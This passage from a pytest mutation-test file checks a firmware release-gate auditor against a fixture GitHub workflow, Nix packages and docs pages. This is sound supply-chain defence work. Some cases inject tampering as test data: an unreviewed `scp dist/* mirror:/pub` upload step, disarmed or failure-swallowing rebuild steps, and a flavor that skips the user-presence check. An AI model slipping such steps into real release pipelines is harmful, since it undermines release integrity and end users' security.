# SPDX-License-Identifier: AGPL-3.0-only
# Copyright (C) 2026 RS-Key contributors
"""The mutation table `release_gate.py` is verified against.

Every clause is broken once on a fixture, the MESSAGE is asserted rather than a
count — a red run whose reason nobody read proves as little as one that cannot go
red — and then each break is re-run with that clause DELETED, so the arm says
which rule found it rather than that something did. Two of the clauses are
load-bearing for a break they do not own (`check_loops_present` returns the
flavor list, `match_steps` returns the pairing), and their deletion arms remove
the judgement while keeping the derivation, because an arm that deletes both
proves nothing.

An adversarial review then drove fourteen defects past the first version of this
table, and the shape of them is worth more than the count: nine were spellings
of a rule reading the right thing in the wrong place — `no-touch` as a FEATURE
rather than a package name, a THIRD `for pkg in` loop leaving "the first two
agree" a statement about a pair somebody chose, a step disarmed with `if: false`
instead of deleted, a whole second job at a different indent, `gh release create
dist/*.uf2` publishing less than the page lists, a `printf` where the rule read
`echo`, and the same verify command rotting on the SIBLING page nobody's rule
reached. Each has a case below. Two of the deletion arms it re-drove were green
for the wrong reason — the break was still red, from another clause — and both
are re-driven here in the spelling a maintainer would actually write, where the
run without the clause is wholly GREEN.

The fixture is the real workflow's SHAPE at a third of its size: the same step
names, so the shipped `ENTRIES` roster is what every case runs against rather
than a copy written to suit the fixture, and three flavors instead of fourteen,
so the flavor floor is a parameter the way `platform_gate`'s board floor is.

Two green arms, and neither is a no-op. Adding a fourth flavor to both loops,
to `nix/firmware.nix` and to the two typed counts changes the region and stays
green, which says the rules track the tree rather than pinning a number; moving
an action pin changes the region and stays green, which says the commit rule
reads THIS repository's history and not "a 40-hex string".

The direction of every red is written into its case name and asserted through the
message, because the failure this programme keeps meeting is a break that reddens
for the inverse reason. The one that matters most here is the `bit-for-bit` /
`source->binary` pair: the finding must say the entry CLAIMED the frontier and
the command settles determinism, not the reverse.
"""

import pathlib
import re
import subprocess
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).parent))
import claims_gate
import gate_lines
import release_gate

pytestmark = pytest.mark.assurance

ROOT = pathlib.Path(__file__).resolve().parents[1]

WORKFLOW = ".github/workflows/release-build.yml"
CALLER = ".github/workflows/release.yml"
NIX = "nix/firmware.nix"
PAGE = "docs/supply-chain.md"

BUILDER = """\
name: release-build

on:
  workflow_call:
    inputs:
      tag:
        required: true
        type: string

permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write # create the release + upload assets
      id-token: write # keyless cosign + the attestation's Fulcio OIDC token
      attestations: write # GitHub build-provenance attestation
    steps:
      - uses: actions/checkout@1111111111111111111111111111111111111111 # v7.0.1
      - uses: DeterminateSystems/nix-installer-action@2222222222222222222222222222222222222222 # v22
      - uses: nix-community/cache-nix-action@3333333333333333333333333333333333333333 # v7.0.2
      - uses: actions/cache@4444444444444444444444444444444444444444 # v6.1.0
      - uses: sigstore/cosign-installer@5555555555555555555555555555555555555555 # v4.1.2
      - name: resolve tag
        id: tag
        run: |
          if [ "$GITHUB_REF" != "refs/tags/$TAG" ]; then
            echo "refusing: this run is not at its tag" >&2
            exit 1
          fi
          git fetch --no-tags --quiet origin +refs/heads/main:refs/remotes/origin/main
          if ! git merge-base --is-ancestor "$TAG^{commit}" origin/main; then
            exit 1
          fi
      - name: build the 3 reproducible firmware flavors
        run: |
          mkdir -p dist
          for pkg in firmware firmware-pqc firmware-fips; do
            out="$(nix build ".#$pkg" --no-link --print-out-paths)"
            label="${pkg#firmware}"; label="${label#-}"
            [ -z "$label" ] && label="default"
            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"
          done
      - name: reproducibility gate — rebuild all 3, require bit-identical
        run: |
          for pkg in firmware firmware-pqc firmware-fips; do
            nix build ".#$pkg" --rebuild --no-link
          done
          echo "all 3 flavors rebuilt bit-identical"
      - name: generate the CycloneDX SBOM
        run: |
          nix develop -c cargo cyclonedx --manifest-path firmware/Cargo.toml --format json
          cp "$sbom" "dist/rs-key-${tag}-sbom.cdx.json"
      - name: checksums
        run: |
          cd dist
          sha256sum ./*.uf2 > SHA256SUMS
      - name: attest build provenance
        id: attest
        uses: actions/attest-build-provenance@6666666666666666666666666666666666666666 # v4.2.2
        with:
          subject-path: dist/*.uf2
      - name: attach the provenance bundle as a release asset
        run: cp "${{ steps.attest.outputs.bundle-path }}" "dist/rs-key-${{ steps.tag.outputs.tag }}.intoto.jsonl"
      - name: sign SHA256SUMS (keyless cosign)
        run: |
          cosign sign-blob --bundle dist/SHA256SUMS.sigstore.json dist/SHA256SUMS
      - name: extract release notes from CHANGELOG
        run: |
          cat CHANGELOG.md > release-notes.md
      - name: create the GitHub Release
        run: |
          gh release create "$tag" --notes-file release-notes.md dist/*
"""

RELEASE = """\
name: release

on:
  push:
    tags: ["v*"]

permissions: {}

jobs:
  release:
    uses: ./.github/workflows/release-build.yml
    with:
      tag: ${{ github.ref_name }}
"""

FIRMWARE_NIX = """\
{ pkgs, target, toolchain }:
let
  mkFirmware =
    { name, cargoFlags ? [ ] }:
    pkgs.stdenv.mkDerivation {
      buildPhase = ''
        runHook preBuild
        cargo build --release --offline --frozen \\
          -p firmware --target ${target}
        runHook postBuild
      '';
      installPhase = ''
        runHook preInstall
        bash scripts/pt.sh "target/${target}/release/firmware" "$out/${name}.elf"
        picotool uf2 convert "$out/${name}.elf" -t elf "$out/${name}.uf2"
        runHook postInstall
      '';
    };
in
{
  packages = {
    firmware = mkFirmware { name = "firmware"; };
    firmware-pqc = mkFirmware {
      name = "firmware-pqc";
      cargoFlags = [
        "--features"
        "advertise-pqc"
      ];
    };
    firmware-fips = mkFirmware {
      name = "firmware-fips";
      cargoFlags = [
        "--features"
        "fips-profile"
      ];
    };
  };
}
"""

PLATFORM = """\
[[assumption]]
id = "PLAT-TOOLCHAIN-001"
class = "toolchain"
statement = "Kani proves over MIR, not over the emitted image."
discharge = "Stage 11's source-to-binary work."
status = "pending"
"""

#: The hand-written half of the page: the two sections whose asset names rule 8
#: reads, plus the marker pair the region is written between. It names the
#: historical signature file on purpose — that carve-out is checked both ways.
SUPPLY_CHAIN = """\
# Supply chain

A release carries `SHA256SUMS`, `SHA256SUMS.sigstore.json` (up to v0.4.10 the
same bytes under the older name `SHA256SUMS.cosign.bundle`),
`rs-key-<tag>-sbom.cdx.json` and `rs-key-<tag>.intoto.jsonl`.

## The release procedure

<!-- release-manifest:start -->
<!-- release-manifest:end -->

## Verifying a download

```sh
gh attestation verify rs-key-<tag>-default.uf2 --repo TheMaxMur/RS-Key
```
"""

RELEASES = """\
# Releases

Three firmware images: `rs-key-<tag>-<flavor>.uf2`, plus `SHA256SUMS` and
`rs-key-<tag>-sbom.cdx.json`.

```sh
cosign verify-blob --bundle SHA256SUMS.sigstore.json SHA256SUMS
```
"""

PT_SH = """\
#!/usr/bin/env bash
set -euo pipefail
picotool partition create --pt "$1" "$2"
"""


class Tree:
    """A checkout shaped like this one, small enough to break one rule at a time."""

    def __init__(self, root):
        self.root = pathlib.Path(root)
        self.write(WORKFLOW, BUILDER)
        self.write(CALLER, RELEASE)
        self.write(NIX, FIRMWARE_NIX)
        self.write("assurance/platform.toml", PLATFORM)
        self.write(PAGE, SUPPLY_CHAIN)
        self.write("docs/releases.md", RELEASES)
        self.write("scripts/pt.sh", PT_SH)
        self.git("init", "-q")
        # A real commit: the commit-stability rule asks git whether a hex string
        # names one, and a repository with no history answers "no" to everything,
        # which would make that rule green by having nothing to find.
        self.commit()
        self.regenerate()

    def write(self, rel, text):
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)

    def edit(self, rel, old, new):
        """Replace `old` once, failing loudly if the fixture no longer says it."""
        path = self.root / rel
        text = path.read_text()
        assert text.count(old) == 1, f"{rel} does not say {old!r} exactly once"
        path.write_text(text.replace(old, new))

    def append(self, rel, text):
        (self.root / rel).write_text((self.root / rel).read_text() + text)

    def git(self, *args):
        subprocess.run(["git", "-C", str(self.root), *args], check=True, capture_output=True)

    def commit(self, message="a state of the tree"):
        self.git("add", "-A")
        self.git(
            "-c", "user.name=t", "-c", "user.email=t@example.invalid",
            "commit", "-q", "-m", message,
        )

    def head(self):
        return subprocess.run(
            ["git", "-C", str(self.root), "rev-parse", "HEAD"],
            check=True, capture_output=True, text=True,
        ).stdout.strip()

    def regenerate(self):
        release_gate.run(self.root, write=True)

    def region(self):
        text = (self.root / PAGE).read_text()
        start = text.index("<!-- release-manifest:start -->")
        end = text.index("<!-- release-manifest:end -->")
        return text[start:end]

    def problems(self, entry_floor=release_gate.ENTRY_FLOOR, flavor_floor=3):
        """`flavor_floor` is a PARAMETER, the way this tree's other floors are:
        the fixture publishes three images and the checkout fourteen, and a floor
        hard-coded to the checkout's number reddens every case."""
        return release_gate.audit(self.root, entry_floor, flavor_floor)[0]


@pytest.fixture
def tree(tmp_path):
    return Tree(tmp_path)


def published_line(tree):
    """The region's `Published assets:` sentence — the set, without the commands."""
    return next(line for line in tree.region().splitlines() if line.startswith("Published assets:"))


def only(problems, needle):
    """The problems mentioning `needle`, and AT MOST ONE of them."""
    hit = [p for p in problems if needle in p]
    assert len(hit) <= 1, hit
    return hit


def gone(monkeypatch, name, replacement=None):
    """The clause `name`, deleted — the arm that says it is what found the break.

    `replacement` is for the two clauses that also carry a derivation the rest of
    the audit needs; everything else is removed outright.
    """
    monkeypatch.setattr(release_gate, name, replacement or (lambda *a, **k: None))


# --- both directions of green -------------------------------------------------


def test_the_fixture_is_green(tree):
    assert tree.problems() == []


def test_this_checkout_is_green():
    findings, summary = release_gate.audit(ROOT)
    assert findings == [], findings
    assert summary.startswith("release-gate: ok")


def test_the_fixture_derives_the_same_shapes_the_checkout_does(tree):
    """A fixture missing a shape would pass that shape's rules vacuously."""
    job, packages, loops, built = release_gate.read(tree.root)
    assert [step["title"] for step in job][:6] == [
        "actions/checkout",
        "DeterminateSystems/nix-installer-action",
        "nix-community/cache-nix-action",
        "actions/cache",
        "sigstore/cosign-installer",
        "resolve tag",
    ]
    assert len(loops) == 2 and loops[0][1] == loops[1][1] == [
        "firmware", "firmware-pqc", "firmware-fips",
    ]
    assert set(packages) == {"firmware", "firmware-pqc", "firmware-fips"}
    assert set(built) == {"buildPhase", "installPhase"}
    assert {release_gate.subject_of(step) for step in job} == {
        "none", "admission", "bit-for-bit", "inventory", "origin", "integrity",
    }


# --- rule 1: the entries and the steps, both ways ------------------------------


def test_a_renamed_step_leaves_its_entry_naming_nothing(tree):
    tree.edit(WORKFLOW, "name: checksums", "name: hash the artifacts")
    tree.regenerate()
    assert only(tree.problems(), "`checksums` names no step")


def test_a_key_that_matches_two_steps_is_refused(tree):
    """The direction a "names no step" rule cannot see: an entry that matches
    MORE steps still matches one, so a rule asking `if not hits` is green."""
    tree.edit(WORKFLOW, "name: extract release notes from CHANGELOG",
              "name: create the GitHub Release notes")
    tree.regenerate()
    assert only(tree.problems(), "names 2 steps")


def test_a_step_no_entry_claims_is_refused(tree):
    """The completeness half: a step added to the pipeline that this page does
    not print is a released command nobody reviews."""
    tree.edit(WORKFLOW, "      - name: checksums",
              "      - name: upload to a mirror\n        run: |\n"
              "          scp dist/* mirror:/pub\n      - name: checksums")
    tree.regenerate()
    assert only(tree.problems(), "'upload to a mirror' is claimed by no manifest entry")


def test_two_entries_claiming_one_step_are_refused(tree, monkeypatch):
    """The direction the entry->step half cannot see: both keys match one step
    each, so both are legal, and `body()`'s last-match-wins silently drops one
    statement. Measured at exit 0 with the summary reporting 16 steps for a
    15-step job."""
    monkeypatch.setattr(
        release_gate, "ENTRIES",
        (*release_gate.ENTRIES,
         {"step": "create the", "subject": "none", "statement": "a stale duplicate"}),
    )
    assert only(tree.problems(), "both name")


def test_without_rule_1_none_of_those_three_is_found(tree, monkeypatch):
    gone(monkeypatch, "match_steps",
         lambda job, findings: {k: v[0] for k, v in release_gate.pair_steps(job).items()
                                if len(v) == 1})
    tree.edit(WORKFLOW, "name: checksums", "name: hash the artifacts")
    tree.regenerate()
    assert only(tree.problems(), "names no step") == []
    assert only(tree.problems(), "claimed by no manifest entry") == []


# --- rule 2 + 3: bit-for-bit is not source->binary -----------------------------


def test_the_rebuild_entry_may_not_claim_the_frontier(tree, monkeypatch):
    """THE case this manifest exists for, and its DIRECTION matters: the message
    must say the entry claimed `source->binary` while its command settles
    `bit-for-bit`, never the reverse. Determinism is not semantic preservation.
    """
    monkeypatch.setattr(
        release_gate, "ENTRIES",
        tuple(
            {**e, "subject": release_gate.FRONTIER}
            if e["step"] == "reproducibility gate" else e
            for e in release_gate.ENTRIES
        ),
    )
    hit = only(tree.problems(), "determinism is not semantic preservation")
    assert hit, tree.problems()
    assert "claims `source->binary`" in hit[0]
    assert "establishes `bit-for-bit`" in hit[0]


def test_a_subject_that_is_not_what_its_command_does_is_refused(tree, monkeypatch):
    """The same rule away from the frontier: the SBOM step does not sign."""
    monkeypatch.setattr(
        release_gate, "ENTRIES",
        tuple(
            {**e, "subject": "integrity"} if e["step"] == "CycloneDX SBOM" else e
            for e in release_gate.ENTRIES
        ),
    )
    hit = only(tree.problems(), "says its subject is `integrity`")
    assert hit and "establishes `inventory`" in hit[0]


def test_a_subject_outside_the_vocabulary_is_refused(tree, monkeypatch):
    monkeypatch.setattr(
        release_gate, "ENTRIES",
        tuple(
            {**e, "subject": "proven"} if e["step"] == "checksums" else e
            for e in release_gate.ENTRIES
        ),
    )
    assert only(tree.problems(), "carries the subject `proven`")


def test_without_rule_2_a_frontier_claim_stands(tree, monkeypatch):
    gone(monkeypatch, "check_subjects")
    monkeypatch.setattr(
        release_gate, "ENTRIES",
        tuple(
            {**e, "subject": release_gate.FRONTIER}
            if e["step"] == "reproducibility gate" else e
            for e in release_gate.ENTRIES
        ),
    )
    assert only(tree.problems(), "determinism is not semantic preservation") == []


def test_a_shape_that_maps_onto_the_frontier_is_refused(tree, monkeypatch):
    """Rule 3a, and the reason it is not the same rule as rule 2: rule 2 reads a
    hand-written field, so widening the MAP would make the claim derived — and
    therefore green — instead of refused."""
    monkeypatch.setattr(
        release_gate, "SHAPE",
        (*release_gate.SHAPE, (release_gate.re.compile("nix build"), release_gate.FRONTIER)),
    )
    assert only(tree.problems(), "is reachable as an entry's subject")


def test_without_rule_3a_the_widened_map_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_frontier_unreachable")
    monkeypatch.setattr(
        release_gate, "SHAPE",
        (*release_gate.SHAPE, (release_gate.re.compile("nix build"), release_gate.FRONTIER)),
    )
    assert only(tree.problems(), "is reachable as an entry's subject") == []


def test_a_discharged_registry_row_reddens_the_open_obligation(tree):
    """Rule 3b, the direction that matters: the page goes on calling a question
    open after the registry has settled it."""
    tree.edit("assurance/platform.toml", 'status = "pending"', 'status = "discharged"')
    assert only(tree.problems(), "PLAT-TOOLCHAIN-001 is `discharged`")


def test_a_missing_registry_row_reddens_the_open_obligation(tree):
    tree.edit("assurance/platform.toml", 'id = "PLAT-TOOLCHAIN-001"', 'id = "PLAT-TOOLCHAIN-009"')
    assert only(tree.problems(), "has no `PLAT-TOOLCHAIN-001` row")


def test_without_rule_3b_a_settled_row_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_frontier_open")
    tree.edit("assurance/platform.toml", 'status = "pending"', 'status = "discharged"')
    assert only(tree.problems(), "is `discharged`") == []


# --- rule 4: the flavors -------------------------------------------------------


def test_a_missing_second_loop_is_refused(tree):
    tree.edit(WORKFLOW, "          for pkg in firmware firmware-pqc firmware-fips; do\n"
                        "            nix build \".#$pkg\" --rebuild --no-link\n"
                        "          done\n",
              "          nix build \".#firmware\" --rebuild --no-link\n")
    tree.regenerate()
    assert only(tree.problems(), "carries 1 `for pkg in` loop(s) and this manifest reads 2")


def test_without_rule_4a_a_single_loop_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_loops_present",
         lambda loops, findings: loops[0][1] if loops else [])
    tree.edit(WORKFLOW, "          for pkg in firmware firmware-pqc firmware-fips; do\n"
                        "            nix build \".#$pkg\" --rebuild --no-link\n"
                        "          done\n",
              "          nix build \".#firmware\" --rebuild --no-link\n")
    tree.regenerate()
    assert only(tree.problems(), "`for pkg in` loop(s)") == []


def test_a_rebuild_loop_that_skips_an_image_is_refused(tree):
    """The defect with the largest blast radius here: the skipped image is
    published, signed and attested with nothing having compared its bytes."""
    tree.edit(WORKFLOW,
              "          for pkg in firmware firmware-pqc firmware-fips; do\n"
              "            nix build \".#$pkg\" --rebuild --no-link\n",
              "          for pkg in firmware firmware-pqc; do\n"
              "            nix build \".#$pkg\" --rebuild --no-link\n")
    tree.regenerate()
    hit = only(tree.problems(), "rebuilds 2")
    assert hit and "['firmware-fips'] differ" in hit[0]


def test_without_rule_4b_the_skipped_image_is_not_found(tree, monkeypatch):
    """The typed counts move WITH the loop here, which is what a maintainer would
    write. Without that, rule 5 answers instead and the arm is green for the
    needle while the run is still red — attribution, not load-bearing. Reviewed
    and re-driven: this spelling leaves the run wholly GREEN."""
    gone(monkeypatch, "check_loops_agree")
    tree.edit(WORKFLOW,
              "          for pkg in firmware firmware-pqc firmware-fips; do\n"
              "            nix build \".#$pkg\" --rebuild --no-link\n",
              "          for pkg in firmware firmware-pqc; do\n"
              "            nix build \".#$pkg\" --rebuild --no-link\n")
    tree.edit(WORKFLOW, "rebuild all 3,", "rebuild all 2,")
    tree.edit(WORKFLOW, "all 3 flavors rebuilt", "all 2 flavors rebuilt")
    tree.regenerate()
    assert tree.problems() == []


def test_the_skipped_image_is_refused_when_its_counts_move_with_it(tree):
    """And the red arm of exactly that spelling, which the first version of this
    table never drove: with the typed counts repaired, rule 5 is silent and rule
    4b is the only thing standing between a skipped image and a signed release."""
    tree.edit(WORKFLOW,
              "          for pkg in firmware firmware-pqc firmware-fips; do\n"
              "            nix build \".#$pkg\" --rebuild --no-link\n",
              "          for pkg in firmware firmware-pqc; do\n"
              "            nix build \".#$pkg\" --rebuild --no-link\n")
    tree.edit(WORKFLOW, "rebuild all 3,", "rebuild all 2,")
    tree.edit(WORKFLOW, "all 3 flavors rebuilt", "all 2 flavors rebuilt")
    tree.regenerate()
    hit = only(tree.problems(), "rebuilds 2")
    assert hit and "['firmware-fips'] differ" in hit[0]


def test_a_third_loop_is_refused(tree):
    """Rule 4a as an EQUALITY. With a third loop present, "the first two agree"
    is a statement about a pair somebody chose — measured: an extra loop in the
    build step plus a dropped image in the rebuild loop was exit 0."""
    tree.edit(WORKFLOW, '          echo "all 3 flavors rebuilt bit-identical"',
              '          echo "all 3 flavors rebuilt bit-identical"\n'
              '          for pkg in firmware firmware-pqc firmware-fips; do echo "$pkg"; done')
    tree.regenerate()
    assert only(tree.problems(), "carries 3 `for pkg in` loop(s) and this manifest reads 2")


def test_a_commented_out_loop_is_not_a_loop(tree):
    """The green arm of the same rule, and the reason `flavor_loops` reads the
    step's CODE: read raw, a commented `# for pkg in …` was a third loop."""
    tree.edit(WORKFLOW, '          echo "all 3 flavors rebuilt bit-identical"',
              '          # for pkg in firmware firmware-pqc; do :; done\n'
              '          echo "all 3 flavors rebuilt bit-identical"')
    tree.regenerate()
    assert tree.problems() == []


def test_a_no_touch_feature_under_another_name_is_refused(tree):
    """Rule 4d by FEATURE. `firmware-testing` carrying `--features no-touch`
    walks past a name test here AND past the workflow's own `ls dist/*no-touch*`,
    because its published label is `testing` — measured at exit 0, with the
    region printing `--features no-touch` in the flavor table."""
    for old, new in (
        ("firmware firmware-pqc firmware-fips; do\n            out=",
         "firmware firmware-pqc firmware-fips firmware-testing; do\n            out="),
        ("firmware firmware-pqc firmware-fips; do\n            nix build",
         "firmware firmware-pqc firmware-fips firmware-testing; do\n            nix build"),
        ("build the 3 reproducible", "build the 4 reproducible"),
        ("rebuild all 3,", "rebuild all 4,"),
        ("all 3 flavors rebuilt", "all 4 flavors rebuilt"),
    ):
        tree.edit(WORKFLOW, old, new)
    tree.edit(NIX, "    firmware-fips = mkFirmware {",
              '    firmware-testing = mkFirmware { name = "firmware-testing";'
              ' cargoFlags = [ "--features" "no-touch" ]; };\n'
              "    firmware-fips = mkFirmware {")
    tree.regenerate()
    assert only(tree.problems(), "would publish ['firmware-testing']")


def test_a_flavor_with_no_nix_package_is_refused(tree):
    tree.edit(NIX, "    firmware-fips = mkFirmware {", "    firmware-fipz = mkFirmware {")
    tree.regenerate()
    assert only(tree.problems(), "['firmware-fips'], which nix/firmware.nix has no")


def test_without_rule_4c_the_absent_package_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_packages_exist")
    tree.edit(NIX, "    firmware-fips = mkFirmware {", "    firmware-fipz = mkFirmware {")
    tree.regenerate()
    assert only(tree.problems(), "has no `mkFirmware`") == []


def test_a_no_touch_flavor_entering_the_loops_is_refused(tree):
    """One step earlier than the workflow's own `ls dist/*no-touch*` refusal, and
    it is the step that matters: a signed presence-bypass asset removes the
    physical-consent gate from an end-user build."""
    for old, new in (
        ("firmware firmware-pqc firmware-fips; do\n            out=",
         "firmware firmware-pqc firmware-fips firmware-no-touch; do\n            out="),
        ("firmware firmware-pqc firmware-fips; do\n            nix build",
         "firmware firmware-pqc firmware-fips firmware-no-touch; do\n            nix build"),
        ("build the 3 reproducible", "build the 4 reproducible"),
        ("rebuild all 3,", "rebuild all 4,"),
        ("all 3 flavors rebuilt", "all 4 flavors rebuilt"),
    ):
        tree.edit(WORKFLOW, old, new)
    tree.edit(NIX, "    firmware-fips = mkFirmware {",
              "    firmware-no-touch = mkFirmware { name = \"firmware-no-touch\"; };\n"
              "    firmware-fips = mkFirmware {")
    tree.regenerate()
    assert only(tree.problems(), "would publish ['firmware-no-touch']")


def test_without_rule_4d_a_no_touch_flavor_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_no_touch")
    for old, new in (
        ("firmware firmware-pqc firmware-fips; do\n            out=",
         "firmware firmware-pqc firmware-fips firmware-no-touch; do\n            out="),
        ("firmware firmware-pqc firmware-fips; do\n            nix build",
         "firmware firmware-pqc firmware-fips firmware-no-touch; do\n            nix build"),
        ("build the 3 reproducible", "build the 4 reproducible"),
        ("rebuild all 3,", "rebuild all 4,"),
        ("all 3 flavors rebuilt", "all 4 flavors rebuilt"),
    ):
        tree.edit(WORKFLOW, old, new)
    tree.edit(NIX, "    firmware-fips = mkFirmware {",
              "    firmware-no-touch = mkFirmware { name = \"firmware-no-touch\"; };\n"
              "    firmware-fips = mkFirmware {")
    tree.regenerate()
    assert only(tree.problems(), "auto-confirms user presence") == []


# --- rule 5: a typed count against the list it counts --------------------------


def test_a_step_name_that_counts_wrong_is_refused(tree):
    """The number in "build the 14 reproducible firmware flavors" is typed by
    hand inside the procedure, and a flavor added without touching it leaves the
    workflow describing a set it no longer builds."""
    tree.edit(WORKFLOW, "build the 3 reproducible", "build the 4 reproducible")
    tree.regenerate()
    hit = only(tree.problems(), "says 4 in 'build the 4 reproducible")
    assert hit and "iterates 3 flavor(s)" in hit[0]


def test_an_echo_that_counts_wrong_is_refused(tree):
    tree.edit(WORKFLOW, "all 3 flavors rebuilt", "all 13 flavors rebuilt")
    tree.regenerate()
    assert only(tree.problems(), "says 13 in 'echo \"all 13 flavors rebuilt")


def test_a_count_outside_an_echo_is_refused_too(tree):
    """The first version scanned only `echo` lines, so rewriting one as a
    `printf` was exit 0 — with the region printing the wrong number itself."""
    tree.edit(WORKFLOW, '          echo "all 3 flavors rebuilt bit-identical"',
              "          printf '%s\\n' \"all 7 flavors rebuilt bit-identical\"")
    tree.regenerate()
    assert only(tree.problems(), "says 7 in")


def test_without_rule_5_a_wrong_count_stands(tree, monkeypatch):
    gone(monkeypatch, "check_counts")
    tree.edit(WORKFLOW, "all 3 flavors rebuilt", "all 13 flavors rebuilt")
    tree.regenerate()
    assert only(tree.problems(), "iterates 3 flavor(s)") == []


def test_a_page_count_that_is_not_the_list_is_refused(tree):
    """Rule 5b, the digit spelling. The workflow's own step names can be right
    while the sentence a reader takes the number from is wrong."""
    tree.edit(PAGE, "A release carries", "A release carries 4 images and")
    tree.regenerate()
    hit = only(tree.problems(), "says '4 images'")
    assert hit and "builds 3 flavor(s)" in hit[0]


def test_a_page_count_spelled_in_english_is_refused_too(tree):
    """The half a digit rule walks past, and the half this page actually uses:
    the shipped sentence is "rebuilds all fourteen flavors"."""
    tree.edit(PAGE, "A release carries", "A release rebuilds all seven flavors and carries")
    tree.regenerate()
    assert only(tree.problems(), "says 'seven flavors'")


def test_the_correct_english_spelling_stays_green(tree):
    """The green arm that says the rule is not "no number-word near a noun"."""
    tree.edit(PAGE, "A release carries", "A release rebuilds all three flavors and carries")
    tree.regenerate()
    assert tree.problems() == []


def test_the_page_count_rule_does_not_read_the_generated_region(tree):
    """The region prints the workflow's own `echo "all 3 flavors rebuilt"`, so a
    rule that read it would be holding a derivation against itself and would
    agree with any workflow at all. The mask is what keeps it off."""
    raw = (tree.root / PAGE).read_text()
    assert [m.group(0) for m in release_gate.PAGE_COUNT.finditer(tree.region())] == [
        "3 flavors"
    ]
    hand = release_gate.hand_written(tree.root, pathlib.Path(PAGE))
    assert "3 flavors" not in hand
    assert hand.count("\n") == raw.count("\n")


def test_without_rule_5b_the_page_count_stands(tree, monkeypatch):
    gone(monkeypatch, "check_page_count")
    tree.edit(PAGE, "A release carries", "A release carries 4 images and")
    tree.regenerate()
    assert only(tree.problems(), "the release iterates") == []


# --- rule 1b: the parser's own completeness ------------------------------------


def test_a_step_with_neither_a_name_nor_a_uses_is_refused(tree):
    """The hole every other rule here is blind to BY CONSTRUCTION: rule 1's
    unclaimed-step half iterates what the parser returned, so a step the parser
    never saw is not an unclaimed step — it is no step at all."""
    tree.edit(WORKFLOW, "      - name: checksums",
              "      - run: scp dist/* mirror:/pub\n      - name: checksums")
    tree.regenerate()
    assert only(tree.problems(), "carries 1 step(s) this parser does not see")


def test_a_whole_second_job_is_refused(tree):
    """The other half of the same hole, and the one with the largest blast
    radius: `steps()` pins the indent to the first step it sees, so a second job
    written at another indent was invisible — measured, `grep -c mirror` on the
    generated page answered 0 for a job that runs `scp dist/* mirror:/pub`."""
    tree.append(WORKFLOW,
                "  mirror:\n    runs-on: ubuntu-latest\n    steps:\n"
                "    - name: publish to the mirror\n      run: scp dist/* mirror:/pub\n")
    tree.regenerate()
    assert only(tree.problems(), "carries 2 `steps:` block(s)")


def test_without_rule_1b_the_invisible_step_is_not_found(tree, monkeypatch):
    """Read for DIRECTION: with the clause gone the run is not merely quieter —
    it is GREEN, which is the whole point. A released `scp` of every artifact to
    a mirror is neither printed on the page nor a finding."""
    gone(monkeypatch, "check_parser_complete")
    tree.edit(WORKFLOW, "      - name: checksums",
              "      - run: scp dist/* mirror:/pub\n      - name: checksums")
    tree.regenerate()
    assert tree.problems() == []


def test_a_page_count_on_the_sibling_page_is_refused(tree):
    """Rule 5b reaches BOTH pages. `docs/releases.md` carries the same verify
    commands and is where a downloader is sent, so a rule scoped to one page
    leaves the rot it exists for open on the other."""
    tree.edit("docs/releases.md", "Three firmware images", "Seven firmware images")
    assert only(tree.problems(), "docs/releases.md says 'Seven firmware images'")


# --- rule 1c: a step that may not run ------------------------------------------


def test_a_step_switched_off_in_place_is_refused(tree):
    """A command's TEXT can never show its effect, so `if: false` on the
    reproducibility gate left the page saying a non-reproducible image is never
    published while nothing rebuilt — measured at exit 0 before this clause."""
    tree.edit(WORKFLOW, "      - name: reproducibility gate — rebuild all 3, require bit-identical\n        run: |",
              "      - name: reproducibility gate — rebuild all 3, require bit-identical\n        if: false\n        run: |")
    tree.regenerate()
    hit = only(tree.problems(), "carries ['if']")
    assert hit and "reproducibility gate" in hit[0]


def test_a_step_that_swallows_its_failure_is_refused(tree):
    tree.edit(WORKFLOW, 'nix build ".#$pkg" --rebuild --no-link',
              'nix build ".#$pkg" --rebuild --no-link || true')
    tree.regenerate()
    assert only(tree.problems(), "swallows a failure")


def test_without_rule_1c_the_disarmed_step_stands(tree, monkeypatch):
    gone(monkeypatch, "check_disarmed")
    tree.edit(WORKFLOW, "      - name: reproducibility gate — rebuild all 3, require bit-identical\n        run: |",
              "      - name: reproducibility gate — rebuild all 3, require bit-identical\n        if: false\n        run: |")
    tree.regenerate()
    assert tree.problems() == []


# --- rule 6: the caller calls this builder -------------------------------------


def test_a_caller_that_calls_something_else_is_refused(tree):
    """The identity in `--certificate-identity-regexp` is the reusable builder's,
    so a caller that stops calling it publishes signatures nobody's documented
    verify command matches."""
    tree.edit(CALLER, "uses: ./.github/workflows/release-build.yml",
              "uses: ./.github/workflows/other-build.yml")
    tree.regenerate()
    assert only(tree.problems(), "['./.github/workflows/other-build.yml'] and this manifest reads")


def test_a_caller_with_a_second_called_workflow_is_refused(tree):
    """"Calls this builder" was the first form and it is a membership test: a
    second `uses:` job moves half a release into a file this manifest never
    opens, measured at exit 0 before the rule became an equality."""
    tree.edit(CALLER, "      tag: ${{ github.ref_name }}",
              "      tag: ${{ github.ref_name }}\n  publish:\n"
              "    uses: ./.github/workflows/release-publish.yml")
    tree.regenerate()
    assert only(tree.problems(), "release-publish.yml")


def test_without_rule_6_the_swapped_builder_is_not_found(tree, monkeypatch):
    """The arm regenerates, because `release.yml`'s digest is in the Inputs table
    and without a regenerate the region diff answers instead — the arm would then
    be green for a reason that is not this clause."""
    gone(monkeypatch, "check_caller")
    tree.edit(CALLER, "uses: ./.github/workflows/release-build.yml",
              "uses: ./.github/workflows/other-build.yml")
    tree.regenerate()
    assert tree.problems() == []


#: The fixture's ref test, whole, so each case below breaks one part of it.
REF_BLOCK = (
    '          if [ "$GITHUB_REF" != "refs/tags/$TAG" ]; then\n'
    '            echo "refusing: this run is not at its tag" >&2\n'
    "            exit 1\n"
    "          fi\n"
)


@pytest.mark.parametrize("broken", [
    "",
    REF_BLOCK.replace("            exit 1\n", ""),
    REF_BLOCK.replace("exit 1", "exit 0"),
    REF_BLOCK.replace("!=", "="),
